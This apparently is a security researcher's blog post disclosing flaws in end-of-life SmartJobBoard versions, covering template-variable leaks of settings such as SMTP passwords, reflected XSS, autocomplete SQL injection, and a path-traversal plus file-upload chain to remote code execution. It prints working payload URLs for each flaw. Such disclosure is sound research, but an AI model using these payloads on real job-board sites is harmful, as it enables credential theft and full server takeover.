---
layout: post
title: "Achieving Unauthenticated Remote Code Execution in SmartJobBoard: A Technical Deep Dive"
date: 2025-07-30
description: In this post i explore critical security flaws in SmartJobBoard software, including template injection, SQL injection, cross-site scripting, and remote code execution.
img:
---

>TL;DR: This post explores vulnerabilities in SmartJobBoard versions 4.5 to 5.0.13. The developer stated that version 5.0.13 was last supported eight years ago and no longer receives security updates. However, hundreds of websites are still running these outdated versions. If your site is one of them, consider migrating to the latest release at [SmartJobBoard.com](https://www.smartjobboard.com).

Our adventure begins with the discovery of a rather perplexing template injection vulnerability on a job board website

![Template injection in SmartJobBoard]({{site.baseurl}}/assets/img/SmartJobBoard/template-injection.png)

After some poking around, I realized that the site only responded to variable names and not much else. For instance, entering {$url} into an input field would echo the value "/ajax/" and any other template injection payloads were either ignored or simply returned blank results.

Digging deeper into the site's JavaScript and CSS files revealed that it was running software by SmartJobBoard. Fortunately for me, although no longer supported, older versions of SmartJobBoard had a self-hosted option and I could potentially get a copy of the software to review.

A quick GitHub keyword search later led me to repositories containing versions 4.2 and 5.0.3. With access to the source code which was powering the site I was able look at what was happening behind the scenes

## Vulnerability #1: Information Disclosure (Versions 4.2 – 5.0.13)

In the source code I found a TemplateProcessor class. As the name suggests, it is responsible for processing page templates and uses the Smarty library to do so.

It registers several custom plugins and also initializes some variables to be used when rendering pages. Of particular interest were the translate plugin, and registerGlobalVariables method.

<pre class="line-numbers no-padding">
<code class="php">$this->registerPlugin('block', 'tr', array(&$this, 'translate'));
...
$this->registerGlobalVariables();
</code></pre>

Looking at the translate plugin, it makes a call to a replace_with_template_vars method each time the 
{% raw %}&lt;tr>…&lt;/tr>{% endraw %} element is used in a template. That method looks like this:

<pre class="line-numbers no-padding">
<code class="php">function replace_with_template_vars($res, &$smarty)
{
    if (preg_match_all('/{[$]([a-zA-Z0-9_.]+)}/', $res, $matches)) {
        foreach($matches[1] as $varName) {
            $varNameArray = explode('.', $varName);
            $value = $smarty->getTemplateVars(is_array($varNameArray) ? $varNameArray[0] : $varName);
            if (is_array($value)) {
                if (is_array($varNameArray)) {
                    $varNameArraySize = sizeof($varNameArray);
                    for ($i = 1; $i < $varNameArraySize; $i++) {
                        if (isset($value[$varNameArray[$i]])) {
                            $value = $value[$varNameArray[$i]];
                        } else {
                            $value = '';
                            break;
                        }
                    }
                } else {
                    $value = '';
                }
            }
            
            $value = str_replace(array('\\', '$'), array('\\\\', '\$'), $value);
            $res = preg_replace('/{[$]'.$varName.'}/u',$value,$res);
        }
    }
    return $res;
}
</code></pre>

It replaces string placeholders like {$current_user.username} with their corresponding values in the $smarty object. For example, the string "Hello {$current_user.username}" would be rendered on a page as "Hello Kuda". Since it reads values directly from the $smarty object we can effectively access any values assigned to it.

Now going back to that registerGlobalVariables() method:

<pre class="line-numbers no-padding">
<code class="php">function registerGlobalVariables()
{
    $variables = SJB_System::getGlobalTemplateVariables();
	foreach ($variables as $name => $value) {
		$this->assign($name, $value);
	}
…
}
</code></pre>

The method assigns values from a getGlobalTemplateVariables function into the $smarty object. Notably getGlobalTemplateVariables creates a "settings" variable

`SJB_System::setGlobalTemplateVariable('settings', SJB_Settings::getSettings());`

It uses a getSettings function to load some values to the variable, that function makes a call to loadSettings, which reads values from the settings table and assigns them to the settings variable:

<pre class="line-numbers no-padding">
<code class="php">public static function loadSettings()
{
    self::$settings = array();
    $settingsInfo = SJB_DB::query("SELECT * FROM `settings`");
	
    foreach ($settingsInfo as $settingInfo) {
        self::$settings[$settingInfo['name']] = $settingInfo['value'];
    }
}
</code></pre>

Altogether, this chain of events makes the information disclosure vulnerability possible. By abusing the logic of translate plugin we can read any value from the settings table. The payload to accomplish that will look something like this:

`$GLOBALS.settings.[value]`

For instance we can retrieve the SMTP password by entering $GLOBALS.settings.smtp_password into any reflected input field

![Template injection in SmartJobBoard]({{site.baseurl}}/assets/img/SmartJobBoard/template-injection-password.png)

This vulnerability exposes sensitive system configuration values including, SMTP credentials (smtp_host, smtp_username, smtp_password), API keys, and admin credentials (username, password).

## Vulnerability #2: Reflected cross site scripting (XSS) (Versions 4.2 – 5.0.13)

Moving on from the template processor, I discovered that the HTML form on the login page loads values from the URL parameters into hidden input fields without any sanitization

<pre class="line-numbers no-padding">
<code class="php">&lt;form ...&gt;
    &lt;input type="hidden" name="return_url" value="{$return_url}" /&gt;
    &lt;input type="hidden" name="action" value="login" /&gt;
    {if $shopping_cart}&lt;input type="hidden" name="shopping_cart" value="{$shopping_cart}" /&gt;{/if}
    {if $proceedToPosting}&lt;input type="hidden" name="proceed_to_posting" value="{$proceedToPosting}" /&gt;{/if}
    {if $productSID}&lt;input type="hidden" name="productSID" value="{$productSID}" /&gt;{/if}
    
    ...
&lt;/form&gt;
</code></pre>

This creates a reflected cross-site scripting (XSS) vulnerability, allowing us to include any arbitrary HTML or Javascript code into the page. For instance, we can use the “shopping_cart” parameter to inject HTML into the page by crafting a URL in this format:

{% raw %}`{site}/login?shopping_cart="><h1>"It's a leap of faith. That's all it is Miles, a leap of faith.</h1>`{% endraw %}

![Reflected cross site scripting]({{site.baseurl}}/assets/img/SmartJobBoard/reflected cross-site-scripting.png)

## Vulnerability #3: SQL Injection (Version 4.2)

Continuing my analysis of the system's features, I came across an autocomplete class. It powers the auto-suggestion functionality for various input fields across the application. 

It uses regular expression matching to extract parameters from the request URL, which are then used to build an SQL query that fetches similar terms from the database

<pre class="line-numbers no-padding">
<code class="php">...
preg_match("(.*/autocomplete/{$field}/{$fieldType}/([a-zA-Z]*)/?)", $requestUri, $tablePrefix);
$tablePrefix = SJB_DB::quote(!empty($tablePrefix[1]) ? $tablePrefix[1] : '');
...
$query = SJB_Request::getVar('q', false);
</code></pre>

Critically, the resultant query is constructed using user-provided values, allowing us to specify both the table and column to search for the autocomplete suggestions in.

<pre class="line-numbers no-padding">
<code class="php">elseif ($fieldType == 'string') {
    $additionalCondition = '';
    $fieldParents        = explode('_', $field);
    $fieldName           = array_pop($fieldParents);

    if ($fieldName == 'City') {
        if ($viewType == 'input') {
            $tablePrefix = 'locations';
            $field       = 'City';
        }
        elseif ($viewType == 'search' && $tablePrefix == 'listings') {
            $listingTypeSid      = SJB_ListingTypeManager::getListingTypeSIDByID($listingTypeID);
            $additionalCondition = '`listing_type_sid` = ' . $listingTypeSid . ' AND';
        }
    }

    $result = SJB_DB::query("SELECT DISTINCT `{$field}` as `value`, COUNT(*) `count` FROM `{$tablePrefix}` WHERE " . $additionalCondition . " `{$field}` LIKE ?s GROUP BY `{$field}` ORDER BY `count` DESC LIMIT 0 , 5", $queryCriterion);
}
</code></pre>

The URLs follow the pattern:

`{site url}/system/miscellaneous/autocomplete/{column}/string/{table}/padding/paddng/?q={search term}`

For instance, we can fetch the passwords and usernames of admin accounts from the administrator table by crafting this url:

`{url}/system/miscellaneous/autocomplete/password/string/administrator/padding/padding/?q=2`

![Using SQLI to get the admin user passwords]({{site.baseurl}}/assets/img/SmartJobBoard/sqli-admin-password.png)


## Vulnerability #4: Template Injection and Remote Code Execution (Versions 4.2 – 5.0.13)

While browsing through the source code of various pages, I noticed that some of them allow users to specify the page template to be loaded via a "template" URL parameter. In the PHP class for the login page i found the following line:

`$template = SJB_Request::getVar('template', 'login.tpl');`

It attempts to retrieve the "template" value from the request parameters. If it is not specified it defaults to the “login.tpl” template. Later in the same class, the $template variable is then passed directly into the template processor’s display method, which processes and renders the specified page template:

`$tp->display($template);`

This effectively gives us full control over what is displayed on the page by allowing us to specify any file on the server to be loaded. For instance, we can achieve an arbitrary file read by crafting a url to load the /etc/passwd file:

`{site url}/login?template=/../../../../etc/passwd`

![arbitrary file read]({{site.baseurl}}/assets/img/SmartJobBoard/arbitrary-file-read.png)

This vulnerability becomes even more critical when combined with an unauthenticated file upload flaw in the ajax_file_upload_handler class. Using it we can upload files to the /files/files directory.

![anauthenticated file upload]({{site.baseurl}}/assets/img/SmartJobBoard/anauthenticated-file-upload.png)

We can then execute the uploaded files by creating a url that points the template variable to it 

`{site url}/login?template=../../../files/files/shell.pdf`

![remote code execution]({{site.baseurl}}/assets/img/SmartJobBoard/remote-code-execution.png)

This sequence of events ultimately leads to a critical, unauthenticated remote code execution vulnerability, granting us full system access on any vulnerable website.

And that’s it. Be sure to drop by again for more pentesting and programming adventures. Till next time!

#### Disclosure Timeline
- **Vendor Contact**: 24/01/2025
- **Vendor Response**: Affected versions have reached end-of-life and are no longer supported
- **Public Disclosure**: 01/08/2025